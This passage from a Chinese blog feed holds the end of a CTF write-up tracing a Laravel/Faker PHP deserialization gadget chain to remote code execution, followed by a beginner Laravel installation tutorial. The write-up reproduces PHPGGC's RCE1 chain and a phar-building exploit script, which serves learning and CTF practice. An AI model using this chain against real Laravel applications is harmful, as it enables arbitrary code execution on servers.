class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">class ValidGenerator</span><br><span class="line">&#123;</span><br><span class="line">    protected $generator;</span><br><span class="line">    protected $validator;</span><br><span class="line">    protected $maxRetries;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    public function __call($name, $arguments)</span><br><span class="line">    &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        do &#123;</span><br><span class="line">            $res = call_user_func_array(array($this-&gt;generator, $name), $arguments);</span><br><span class="line">            $i++;</span><br><span class="line">            if ($i &gt; $this-&gt;maxRetries) &#123;</span><br><span class="line">                throw new \OverflowException(sprintf(&apos;Maximum retries of %d reached without finding a valid value&apos;, $this-&gt;maxRetries));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; while (!call_user_func($this-&gt;validator, $res));</span><br><span class="line"></span><br><span class="line">        return $res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Generator类</p><p>这里Generator类中<code>__call</code>方法中<code>$method</code>以及<code>$attributes</code>全部都是可以控制的，分别对应前面的<code>$name</code>以及<code>$arguments</code>或者是对应前前面的<code>dispatch</code>以及<code>event</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class Generator</span><br><span class="line">&#123;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">    public function __call($method, $attributes)</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;format($method, $attributes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进format，可以看到这里将$formatter作为回调函数，$arguments作为参数进行调用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">public function format($formatter, $arguments = array())</span><br><span class="line">&#123;</span><br><span class="line">    return call_user_func_array($this-&gt;getFormatter($formatter), $arguments);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>继续跟进getFormatter,发现这里只将$formatter传入并且返回<code>$this-&gt;formatters[$formatter]</code>，但是这里$formatter的值是不可控的初值dispatch，这里陷入僵局（说实在话这里假如我自己看，是完全看不出来的），回到我们初始的目的，我们需要将<code>$this-&gt;getFormatter($formatter)</code>构造成一个我们可以控制的函数名来进行利用，我们可以想办法将<code>$this-&gt;getFormatter($formatter)</code>变成数组，于是数组的第一个键名为dispatch，键值任意，第二个键名随意，键值为我们想要控制的函数值（好像不用这么麻烦如果可以构造如dispatch=&gt;xxx，不就好了吗？？？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">   public function getFormatter($formatter)</span><br><span class="line">   &#123;</span><br><span class="line">       if (isset($this-&gt;formatters[$formatter])) &#123;</span><br><span class="line">           return $this-&gt;formatters[$formatter];</span><br><span class="line">       &#125;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对没错，回头看了下PHPGGC的payload就是直接构造dispatch=&gt;xxx，可以看到<code>formatters</code>为之前定义的一个<br>变量protected $formatters = array()，这个是可以控制的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class Generator</span><br><span class="line">&#123;</span><br><span class="line">    protected $providers = array();</span><br><span class="line">    protected $formatters = array();</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>所以我们最终可以构造如下payload，这个是在PHPGGC中的payload，构造出<code>new \Faker\Generator($function)</code>，其中$function是我们想要的函数，$parameter是我们想要的值最终造成<code>return $this-&gt;formatters[$formatter]</code>变成<code>$this-&gt;formatters=dispatch-&gt;$function</code>而<code>call_user_func_array($this-&gt;getFormatter($formatter), $arguments)</code>变成了<code>call_user_func_array($function,$parameter)</code>最终构成RCE执行任意我们想执行的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace GadgetChain\Laravel;</span><br><span class="line"></span><br><span class="line">class RCE1 extends \PHPGGC\GadgetChain\RCE</span><br><span class="line">&#123;</span><br><span class="line">    public static $version = &apos;5.4.27&apos;;</span><br><span class="line">    public static $vector = &apos;__destruct&apos;;</span><br><span class="line">    public static $author = &apos;cf&apos;;</span><br><span class="line"></span><br><span class="line">    public function generate(array $parameters)</span><br><span class="line">    &#123;</span><br><span class="line">        $function = $parameters[&apos;function&apos;];</span><br><span class="line">        $parameter = $parameters[&apos;parameter&apos;];</span><br><span class="line"></span><br><span class="line">        return new \Illuminate\Broadcasting\PendingBroadcast(</span><br><span class="line">            new \Faker\Generator($function),</span><br><span class="line">            $parameter</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好吧，到这里终于能解释一个PHPGGC的RCE了，以后如果想练习反序列化可以用这个练习，我觉得laravel框架反序列链远远不止PHPGGC的四个RCE，网上找了下就看到不同师傅各种操作。</p><hr><p>回到这个题目，我们可以直接用PHPGGC的RCE1构成payload,来吧试试看,我感觉行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">namespace Illuminate\Broadcasting</span><br><span class="line">&#123;</span><br><span class="line">    class PendingBroadcast</span><br><span class="line">    &#123;</span><br><span class="line">        protected $events;</span><br><span class="line">        protected $event;</span><br><span class="line"></span><br><span class="line">        function __construct($events, $cmd)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;events = $events;</span><br><span class="line">            $this-&gt;event = $cmd;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace Faker</span><br><span class="line">&#123;</span><br><span class="line">    class Generator</span><br><span class="line">    &#123;</span><br><span class="line">        protected $formatters;</span><br><span class="line"></span><br><span class="line">        function __construct($function)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;formatters = [&apos;dispatch&apos; =&gt; $function];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">namespace&#123;</span><br><span class="line">    $function = &apos;assert&apos;;</span><br><span class="line">    $parameters = &apos;phpinfo()&apos;;</span><br><span class="line">  $o=new \Illuminate\Broadcasting\PendingBroadcast(</span><br><span class="line">            new \Faker\Generator($function),</span><br><span class="line">            $parameter</span><br><span class="line">        );</span><br><span class="line">    $filename = &apos;poc.phar&apos;;// 后缀必须为phar，否则程序无法运行</span><br><span class="line">    file_exists($filename) ? unlink($filename) : null;</span><br><span class="line">    $phar=new Phar($filename);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); &quot;);</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line">    $phar-&gt;addFromString(&quot;foo.txt&quot;,&quot;bar&quot;);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>可以说看到怀疑人生….</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170681</a><br><a href="http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/" target="_blank" rel="noopener">http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/</a><br><a href="http://m4p1e.com/web/20181224.html" target="_blank" rel="noopener">http://m4p1e.com/web/20181224.html</a><br><a href="https://www.anquanke.com/post/id/170681" target="_blank" rel="noopener">https://www.anquanke.com/post/id/170681</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      PHP反序列化之寻找pop链入门练习主要是代码审计星球lumenserial题目复现，顺便再加深下我对Laravel框架的理解
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="php反序列化" scheme="https://museljh.github.io/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>从零开始学习PHP框架之laravel入门</title>
    <link href="https://museljh.github.io/2019/03/09/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0PHP%E6%A1%86%E6%9E%B6%E4%B9%8Blaravel%E5%85%A5%E9%97%A8/"/>
    <id>https://museljh.github.io/2019/03/09/从零开始学习PHP框架之laravel入门/</id>
    <published>2019-03-09T12:41:16.000Z</published>
    <updated>2019-03-09T12:46:03.105Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在大多数PHP项目都是基于框架进行开发的，所以学习PHP框架最了解PHP编写web应用程序有着十分重要的作用，也能让我们不仅仅从局部角度去思考一个漏洞为什么产生，而能够让我们以一种全局的眼观看待一个漏洞产生的始末。本文也主要是讲解如何熟练上手PHP框架。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="一、PHP框架的简要介绍"><a href="#一、PHP框架的简要介绍" class="headerlink" title="一、PHP框架的简要介绍"></a>一、PHP框架的简要介绍</h3><p>形象的来说，PHP框架 把 PHP 程序开发摆到了流水线上。换句话说，PHP开发框架有助于促进快速软件开发（RAD），这节约了你的时间，有助于创建更为稳定的程序，并减少开发者的重复编写代码的劳动。<br>我们通常认为PHP框架的作用相当于模型-视图-控制器（Model View<br>Controller）。MVC是种编程的架构模式，将业务逻辑从UI中分离出来，允许一个一个单独修改。它隔离了业务逻辑与 UI，允许其一改变而另一者不受影响；在 MVC 中，模型负责数据，视图负责表现，控制器则是程序主体或者说是负责业务逻辑。从本质上说，MVC 拆分了一个程序的开发过程，这样你就可以修改独立的每一部分，而其他部分不受影响。这是十分重要的，它使得编写 PHP 代码更为快捷简单。<br>PHP框架 已经对常见的安全性如表单检测、SQL注入等常见的安全问题做了一定的内置处理。当然，不是用上 PHP 就绝对安全了，最重要的还是要程序开发人员自己有安全意识与经验。</p><h3 id="二、php常见框架"><a href="#二、php常见框架" class="headerlink" title="二、php常见框架"></a>二、php常见框架</h3><p>在Github上搜索PHP<br><img src="https://i.imgur.com/NhuUm1c.png" alt=""><br><img src="https://i.imgur.com/7cvJJLQ.png" alt=""><br>在过去几年中，Lavarel有很明显的优势一直处在最热门PHP框架的冠军位置，同样在2019年也是如此，在Github star数甚至是第二名的差不多2.5倍可见它的受欢迎程度。当然常见框架除了laravel还有symfony、CodeIgniter、yii2、cakephp、ZendFramework当然还有国产的THinkPHP，<br>在谷歌走势图中<br><img src="https://i.imgur.com/A72fBJf.png" alt=""><br>laravel在世界始终是排名第一，并且远远超过其他<br>但是在中国PHP框架使用最多的却是yii这里并不包括thinkphp<br><img src="https://i.imgur.com/VijZmEt.png" alt=""><br>具体原因很多，主要原因可能是国内还需要科学上网的原因？或者是laravel学习门槛要比ThinkPHP高很多的原因。反正原因很多，<br>在中国还是thinkPHP以及yii2比较流行</p><h3 id="三、如何上手一个新的框架"><a href="#三、如何上手一个新的框架" class="headerlink" title="三、如何上手一个新的框架"></a>三、如何上手一个新的框架</h3><p>如今的PHP框架层出不穷，我该如何才能更快地开始使用某个新的框架呢?最简单的方式就是练习几个简单的demo来熟悉这个框架<br>1、你好世界（hello world）<br>这里练习的必要性我就不多作说明了。在一个新的框架上构建一个应用，在页面中显示“‘hello world”。当然，做起来不会那么简单。</p><p>2、计算器（calculator）<br>写一个简单的计算器程序，结合表单，对两个操作数进行加减乘除等运算，并把结果输出到页面上。你需要为每一种运算设置单独的动作，或者说方法（每个框架的叫法不一样），而且还要用到框架中的表单验证功能（如果框架提供了这一功能的话）。</p><p>3、留言板（guestbook）<br>让我们回到1998年——建立一个留言本程序，在页面上显示一个表单让用户填写，然后提交到这个应用程序里，继而存储到数据库或文本文件中（视你自己的情况而定），并把用户留言的内容显示到页面上。如果框架提供了创建HTML表单、对象模型或层等功能，就用上它们吧。</p><p>4、解析和分页（parse and paginate）<br>选一个RSS源或其他XML源，解析其中的条目并显示出来。同时添加一个分页的功能，让用户可以五条五条地浏览，并在页面的顶部或底部添加页码。如果框架里提供了这样的功能，就使用它吧。</p><p>完成以上的练习后，你应该就可以清楚地知道如何使用这个框架了，并能用它完成更复杂的工作，或是继续探索这个框架的其他功能。如果你还是不会用，或者花了很多时间来完成以上练习，那么我觉得这个框架不适合你，还是找些其他的来用吧。</p><p>记住，如果在使用框架的过程中遇到困难，记得去该框架的社区里寻求帮助。一个有这强大社区支持的框架会为你未来的工作带来很大帮助，同时也表明这个框架是个不错的框架。没有人希望在使用某框架后的六个月，框架的开发者就宣布停止开发，这就太气人了。</p><h3 id="四、laravel"><a href="#四、laravel" class="headerlink" title="四、laravel"></a>四、laravel</h3><p>毕竟laravel毕竟是全球目前最受欢迎的php框架，我们第二个学习的目标就是它。</p><h3 id="关于Laravel"><a href="#关于Laravel" class="headerlink" title="关于Laravel"></a>关于Laravel</h3><p>Laravel是一个具有表现力，优雅语法的Web应用程序框架。我们相信，发展必须是一种愉快和创造性的体验才能真正实现。Laravel通过简化许多Web项目中使用的常见任务来消除开发中的痛苦，例如：</p><p>简单，快速的路由引擎。<br>强大的依赖注入容器。<br>用于会话和缓存存储的多个后端。<br>富有表现力的直观数据库ORM。<br>数据库无关模式迁移。<br>强大的后台工作处理。<br>实时事件广播。<br>Laravel易于访问，功能强大，并提供大型，强大的应用程序所需的工具。</p><h3 id="1、Laravel学习地址"><a href="#1、Laravel学习地址" class="headerlink" title="1、Laravel学习地址"></a>1、Laravel学习地址</h3><p>关于Laravel的学习我们可以在如下网站进行学习</p><blockquote><p><a href="https://laravel.com/docs/5.7" target="_blank" rel="noopener">https://laravel.com/docs/5.7</a><br><a href="https://laracasts.com/series/laravel-from-scratch-2018" target="_blank" rel="noopener">https://laracasts.com/series/laravel-from-scratch-2018</a><br><a href="https://www.kancloud.cn/tonyyu/laravel_5_6/786050" target="_blank" rel="noopener">https://www.kancloud.cn/tonyyu/laravel_5_6/786050</a></p></blockquote><h3 id="2-Composer安装"><a href="#2-Composer安装" class="headerlink" title="2.Composer安装"></a>2.Composer安装</h3><blockquote><p><a href="https://getcomposer.org/download/" target="_blank" rel="noopener">https://getcomposer.org/download/</a></p></blockquote><blockquote><p><a href="https://learnku.com/docs/lumen/5.7/installation/2402" target="_blank" rel="noopener">https://learnku.com/docs/lumen/5.7/installation/2402</a></p></blockquote><blockquote><p><a href="https://segmentfault.com/a/1190000011858458" target="_blank" rel="noopener">https://segmentfault.com/a/1190000011858458</a></p></blockquote><blockquote><p><a href="https://www.jianshu.com/p/7c745aa026ea" target="_blank" rel="noopener">https://www.jianshu.com/p/7c745aa026ea</a></p></blockquote><h4 id="一-安装"><a href="#一-安装" class="headerlink" title="一.安装"></a>一.安装</h4><p>在中国建议使用如下命令进行安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php -r &quot;copy(&apos;https://install.phpcomposer.com/installer&apos;, &apos;composer-setup.php&apos;);&quot;</span><br><span class="line"></span><br><span class="line">php composer-setup.php</span><br><span class="line"></span><br><span class="line">php -r &quot;unlink(&apos;composer-setup.php&apos;);&quot;</span><br></pre></td></tr></table></figure><h4 id="二-全局安装"><a href="#二-全局安装" class="headerlink" title="二.全局安装"></a>二.全局安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv composer.phar /usr/local/bin/composer</span><br></pre></td></tr></table></figure><h4 id="三-更换Composer源"><a href="#三-更换Composer源" class="headerlink" title="三.更换Composer源"></a>三.更换Composer源</h4><p>Composer国外的源非常不稳定，建议更换成国内的源</p><p>方法一.修改 composer 的全局配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config -g repo.packagist composer https://packagist.phpcomposer.com</span><br></pre></td></tr></table></figure><p>方法二.修改当前项目的 composer.json 配置文件<br>打开命令行窗口（windows用户）或控制台（Linux、Mac 用户），进入你的项目的根目录（也就是 composer.json 文件所在目录），执行如下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer config repo.packagist composer https://packagist.phpcomposer.com</span><br></pre></td></tr></table></figure><h4 id="四-Composer安装Laravel-不建议巨麻烦"><a href="#四-Composer安装Laravel-不建议巨麻烦" class="headerlink" title="四.Composer安装Laravel(不建议巨麻烦)"></a>四.Composer安装Laravel(不建议巨麻烦)</h4><p>这种方法巨傻逼，会遇到一堆问题，千万不要尝试,我就是尝试了下，差点疯了。<br>通过Composer安装Laravel有两种方法</p><p>注意 ！！！<br>安装的时候一定要满足如下这些条件，不然会出现一堆让你怀疑人生的问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PHP&gt; = 7.1.3</span><br><span class="line">OpenSSL PHP扩展</span><br><span class="line">PDO PHP扩展</span><br><span class="line">Mbstring PHP扩展</span><br><span class="line">Tokenizer PHP扩展</span><br><span class="line">XML PHP扩展</span><br><span class="line">Ctype PHP扩展</span><br><span class="line">JSON PHP扩展</span><br><span class="line">BCMath PHP扩展</span><br></pre></td></tr></table></figure><p>首先安装依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php7.2-xml</span><br><span class="line"></span><br><span class="line">sudo apt-get install php-mbstring</span><br></pre></td></tr></table></figure><p>1.通过 Laravel 安装器<br>首先，通过使用 Composer 安装 Laravel 安装器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer global require &quot;laravel/installer&quot;</span><br></pre></td></tr></table></figure><p>注意：这里需要安装一个PHP插件-zip extension 否则会出现如下错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line"> Problem 1</span><br><span class="line">    - laravel/installer v2.0.1 requires ext-zip * -&gt; the requested PHP extension zip is missing from your system.</span><br><span class="line">    - laravel/installer v2.0.0 requires ext-zip * -&gt; the requested PHP extension zip is missing from your system.</span><br><span class="line">    - Installation request for laravel/installer ^2.0 -&gt; satisfiable by laravel/installer[v2.0.0, v2.0.1].</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>安装zip extension插件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># For php v7.0</span><br><span class="line">sudo apt-get install php7.0-zip</span><br><span class="line"></span><br><span class="line"># For php v7.1</span><br><span class="line">sudo apt-get install php7.1-zip</span><br><span class="line"></span><br><span class="line"># For php v7.2</span><br><span class="line">sudo apt-get install php7.2-zip</span><br></pre></td></tr></table></figure><p>配置PATH环境变量</p><p>将 ~/.composer/vendor/bin 添加到 PATH 环境变量中，这样可执行文件 laravel 就能被你的系统检测到了。</p><p>编辑 ~/.bash_profile 文件， vim ~/.bash_profile 加入如下代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;~/.composer/vendor/bin:$PATH&quot;</span><br></pre></td></tr></table></figure><p>或者直接</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;~/.composer/vendor/bin:$PATH&quot;</span><br></pre></td></tr></table></figure><p>这里要注意使用Laravel5.1以上版本的时候需要使用一下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export PATH=&quot;~/.config/composer/vendor/bin:$PATH&quot;</span><br></pre></td></tr></table></figure><p>这时候</p><p>装完成后， laravel new 命令会在您指定的目录创建一个全新的 Laravel 项目。例如， laravel new blog 将会创建一个名为 blog 的目录，并已安装好所有的 Laravel 依赖项：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">laravel new blog</span><br></pre></td></tr></table></figure><ul><li>为什么 Composer 可以安装 Laravel 框架呢？</li></ul><p>其实 Laravel框架也是一个 Composer包，我们可以通过如下命令查看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer show --all laravel/laravel</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">...</span><br><span class="line">name     : laravel/laravel</span><br><span class="line">descrip. : The Laravel Framework.</span><br><span class="line">keywords : framework, laravel</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>2.通过 Laravel 安装器</p><p>通过 Composer 的 create-project 命令来安装 Laravel 应用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist laravel/laravel blog</span><br></pre></td></tr></table></figure><p>使用这种方法时候可能也会踩如上的坑，如果想使用这种方法请看上面</p><p>3.具体实践一下<br>我们拿一个CTF题目进行搭建，题目源码来自代码审计星球。</p><blockquote><p><a href="https://code-breaking.com/puzzle/7/" target="_blank" rel="noopener">https://code-breaking.com/puzzle/7/</a></p></blockquote><p>下载并将其放入需要安装目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Composer install</span><br></pre></td></tr></table></figure><p>如果您在本地安装了 PHP，并且您想使用 PHP内置的服务器来为您的应用程序提供服务，可以使用以下命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -S 0.0.0.0:8000 -t html</span><br></pre></td></tr></table></figure><p>可以愉快做题了。</p><h3 id="3-Homestead安装"><a href="#3-Homestead安装" class="headerlink" title="3.Homestead安装"></a>3.Homestead安装</h3><blockquote><p><a href="https://www.kancloud.cn/tonyyu/laravel_5_6/786195" target="_blank" rel="noopener">https://www.kancloud.cn/tonyyu/laravel_5_6/786195</a></p></blockquote><blockquote><p><a href="https://www.jianshu.com/p/aca8305eb392" target="_blank" rel="noopener">https://www.jianshu.com/p/aca8305eb392</a></p></blockquote><h3 id="以CTF题目讲解laravel目录结构"><a href="#以CTF题目讲解laravel目录结构" class="headerlink" title="以CTF题目讲解laravel目录结构"></a>以CTF题目讲解laravel目录结构</h3><p>具体看这里</p><blockquote><p><a href="https://www.kancloud.cn/tonyyu/laravel_5_6/786088" target="_blank" rel="noopener">https://www.kancloud.cn/tonyyu/laravel_5_6/786088</a></p></blockquote><p>就以前面lumenserial为例子，实战讲解。</p><h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p>laravel跟新换代速度非常快，有的时候目录结构变化会很大，所以我们只要理解里面蕴含的思想就可以了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    app             核心目录（框架的核心代码在 /vendor/laravel/framework 里面</span><br><span class="line">    bootstrap       框架启动、自动加载配置（目录包含了少许文件，app.php 用于框架的启动和自动载入配置，还有一个 cache 文件夹，里面包含了框架为提升性能所生成的文件，如路由和服务缓存文件</span><br><span class="line">    config          所有文件的配置（config 目录包含了应用所有的配置文件，建议通读一遍这些配置文件以便熟悉 Laravel 所有默认配置项；</span><br><span class="line">    database        数据库相关（database 目录包含了数据库迁移文件及填充文件，如果有使用 SQLite 的话，你还可以将其作为 SQLite 数据库存放目录；</span><br><span class="line">    public          入口文件、项目静态资源文件（public 目录包含了应用入口文件 index.php 和前端资源文件（图片、JavaScript、CSS等），该目录也是 Apache 或 Nginx 等 Web 服务器所指向的应用根目录，这样做的好处是隔离了应用核心文件直接暴露于 Web 根目录之下，如果权限系统没做好或服务器配置有漏洞的话，很可能导致应用敏感文件被黑客窃取，进而对网站安全造成威胁；</span><br><span class="line">    resources       视图文件（routes 目录包含了应用定义的所有路由。Laravel 默认提供了四个路由文件用于给不同的入口使用：web.php、api.php、 console.php 和 channels.php。</span><br><span class="line"></span><br><span class="line">web.php 文件包含的路由通过 RouteServiceProvider 引入，都被约束在 web 中间件组中，因而支持 Session、CSRF 保护以及 Cookie 加密功能，如果应用无需提供无状态的、RESTful 风格的 API，那么路由基本上都要定义在 web.php 文件中。</span><br><span class="line"></span><br><span class="line">api.php 文件包含的路由通过 RouteServiceProvider 引入，都被约束在 api 中间件组中，因而支持频率限制功能，这些路由是无状态的，所以请求通过这些路由进入应用需要通过 token 进行认证并且不能访问 Session 状态。</span><br><span class="line"></span><br><span class="line">console.php 文件用于定义所有基于闭包的控制台命令，每个闭包都被绑定到一个控制台命令并且允许与命令行 IO 方法进行交互，尽管这个文件并不定义 HTTP 路由，但是它定义了基于控制台的应用入口（路由）。</span><br><span class="line"></span><br><span class="line">channels.php 文件用于注册应用支持的所有事件广播频道。</span><br><span class="line">    storage         编译后的模板文件、日志文件、缓存文件</span><br><span class="line">    tests           单元测试目录</span><br><span class="line">    vendor          composer加载的依赖文件</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/FomYZlx.png" alt=""></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://www.jianshu.com/p/7c745aa026ea" target="_blank" 